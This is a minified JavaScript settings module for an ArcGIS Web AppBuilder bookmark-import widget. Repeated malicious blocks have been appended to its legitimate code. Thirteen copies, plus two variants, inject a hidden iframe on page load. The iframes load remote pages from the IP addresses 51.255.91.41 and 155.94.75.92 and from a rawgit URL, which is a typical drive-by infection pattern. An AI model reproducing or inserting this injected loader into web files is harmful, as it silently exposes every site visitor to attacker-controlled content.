// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Bookmark/setting/Import.html":'\x3cdiv class\x3d"import jimu-widget-bookmark"\x3e\r\n  \x3cdiv class\x3d"import-tips"\x3e${nls.importFromWeb}\x3c/div\x3e\r\n\r\n  \x3cdiv data-dojo-attach-point\x3d"bookmarksInWebmap" class\x3d"bookmarks-in-webmap"\x3e\r\n    \x3cdiv class\x3d"select-all-cb"\x3e\r\n      \x3cdiv type\x3d"checkbox" checked\x3d"false" id\x3d"all" data-dojo-type\x3d"jimu/dijit/CheckBox" data-dojo-attach-point\x3d"all"\x3e\x3c/div\x3e\r\n      \x3clabel class\x3d"all-label" for\x3d"all"\x3e${nls.selectAll}\x3c/label\x3e\r\n    \x3c/div\x3e\r\n\r\n    \x3cdiv data-dojo-attach-point\x3d"bookMarkerContainer" class\x3d"bookmarker-container editing"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\r\n  \x3cdiv data-dojo-attach-point\x3d"noBookmark" class\x3d"no-bookmark"\x3e${nls.noBookmarkInWebMap}\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/html dojo/_base/array dojo/on dijit/_WidgetsInTemplateMixin jimu/BaseWidgetSetting jimu/utils ../utils ../ItemNode dojo/text!./Import.html".split(" "),function(h,b,c,g,e,k,l,m,f,n,p){var q=window.Sortable;return h([l,k],{baseClass:"jimu-Bookmark-Import",templateString:p,bookmarks:[],_selectedBookMarksNumber:0,postCreate:function(){this.inherited(arguments);this.sortableBookMarkerNodes=q.create(this.bookMarkerContainer,{handle:".drag-masker",sort:!1,
disabled:!this._init_editing,animation:100});this.bookmarks=f.readBookmarksInWebmap(this.map);this.displayBookmarks(this.bookmarks);this.bookmarks&&0===this.bookmarks.length?c.addClass(this.bookmarksInWebmap,"hide"):c.addClass(this.noBookmark,"hide");this.own(e(this.all,"change",b.hitch(this,function(){this._selectOrUnselectAll()})))},startup:function(){this.bookmarksInSetting&&this.bookmarksInSetting.forEach(b.hitch(this,function(a){if((a=f.findBookMarkByNameAndExtent(a,this.bookmarks))&&a.bookmark)a.bookmark.itemNode.onSelected()}))},
getConfig:function(){var a=[];this.bookmarks.forEach(b.hitch(this,function(d){d.itemNode&&d.itemNode.domNode&&c.hasClass(d.itemNode.domNode,"selected")&&(delete d.itemNode,d=b.clone(d),a.push(d))}));return a},_isSelectedAll:function(){return this.bookmarks.length===this._selectedBookMarksNumber},_selectOrUnselectAll:function(){this._isSelectedAll()?(this.bookmarks.forEach(b.hitch(this,function(a){a.itemNode&&a.itemNode.domNode&&c.hasClass(a.itemNode.domNode,"selected")&&c.removeClass(a.itemNode.domNode,
"selected")})),this._selectedBookMarksNumber=0):this.bookmarks.forEach(b.hitch(this,function(a){a.itemNode&&a.itemNode.domNode&&!1===c.hasClass(a.itemNode.domNode,"selected")&&(c.addClass(a.itemNode.domNode,"selected"),this._selectedBookMarksNumber++)}))},destroy:function(){g.forEach(this.bookmarks,function(a){a.itemNode&&a.itemNode.destroy()},this);this.bookmarks=[];this.sortableBookMarkerNodes&&(this.sortableBookMarkerNodes.destroy(),this.sortableBookMarkerNodes=null);this.inherited(arguments)},
displayBookmarks:function(a){a.reverse();g.forEach(a,function(a,b){b=this._createBookMarkNode(a,b);a.itemNode=b},this);a.forEach(b.hitch(this,function(a){a.itemNode&&a.itemNode.domNode&&c.place(a.itemNode.domNode,this.bookMarkerContainer,"first")}))},_createBookMarkNode:function(a,d){var c;c=a.thumbnail||"undefined"!==typeof a.thumbnail&&""!==a.thumbnail?m.processUrlInWidgetConfig(a.thumbnail,this.folderUrl):this.folderUrl+"images/thumbnail_default.png";a=new n({dataId:d,img:c,label:a.displayName||
a.name,display:{selectedBtn:!0,editBtn:!1,deleteBtn:!1},nls:this.nls});this.own(e(a,"click",b.hitch(this,b.partial(this._onBookmarkClick,a))));this.own(e(a,"selected",b.hitch(this,b.partial(this._onBookmarkSelected,a))));this.own(e(a,"unselected",b.hitch(this,b.partial(this._onBookmarkUnSelected,a))));return a},_onBookmarkClick:function(a){a.onSelected()},_onBookmarkSelected:function(){this._selectedBookMarksNumber++;this._isDisableOK()},_onBookmarkUnSelected:function(){this._selectedBookMarksNumber--;
this._isDisableOK()},_isDisableOK:function(){this.popup&&(0<this._selectedBookMarksNumber?this.popup.enableButton(0):this.popup.disableButton(0),f.setCheckboxWithoutEvent(this.all,this._isSelectedAll()))}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});